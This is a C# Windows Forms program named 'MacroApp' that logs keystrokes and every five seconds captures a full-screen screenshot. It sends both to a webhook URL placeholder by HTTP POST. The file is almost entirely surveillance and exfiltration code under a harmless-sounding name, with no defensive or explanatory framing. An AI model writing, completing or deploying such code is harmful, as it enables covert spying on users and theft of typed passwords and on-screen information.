using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;
using NAudio.Wave;

namespace MacroApp
{
    public partial class Form1 : Form
    {
        private static readonly HttpClient client = new HttpClient();
        private static string keystrokes = "";
        private Timer timer;

        public Form1()
        {
            InitializeComponent();
            StartKeystrokeListener();
            StartTimer();
        }

        private void StartKeystrokeListener()
        {
            Application.AddMessageFilter(new KeystrokeListener());
        }

        private void StartTimer()
        {
            timer = new Timer();
            timer.Interval = 5000; // 5 seconds
            timer.Tick += async (sender, e) => await CaptureAndSendData();
            timer.Start();
        }

        private async Task CaptureAndSendData()
        {
            byte[] imageBytes = CaptureScreenshot();
            await SendDataToWebhook(imageBytes, keystrokes);
            keystrokes = ""; // Clear keystrokes after sending
        }

        private byte[] CaptureScreenshot()
        {
            var screenSize = Screen.PrimaryScreen.Bounds;
            using (var bitmap = new Bitmap(screenSize.Width, screenSize.Height))
            {
                using (var g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(screenSize.X, screenSize.Y, 0, 0, screenSize.Size);
                }
                using (var ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                    return ms.ToArray();
                }
            }
        }

        private async Task SendDataToWebhook(byte[] imageBytes, string keystrokes)
        {
            var boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            var formData = new MultipartFormDataContent(boundary);
            formData.Add(new ByteArrayContent(imageBytes), "image", "screenshot.png");
            formData.Add(new StringContent(keystrokes), "keystrokes");

            try
            {
                var response = await client.PostAsync("https://your-webhook-url.com", formData);
                Console.WriteLine($"Response status: {response.StatusCode}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending data: {ex.Message}");
            }
        }

        private class KeystrokeListener : IMessageFilter
        {
            public bool PreFilterMessage(ref Message m)
            {
                if (m.Msg == 0x0100) // WM_KEYDOWN
                {
                    var key = (Keys)m.WParam.ToInt32();
                    keystrokes += key.ToString() + " ";
                }
                return false;
            }
        }
    }
}
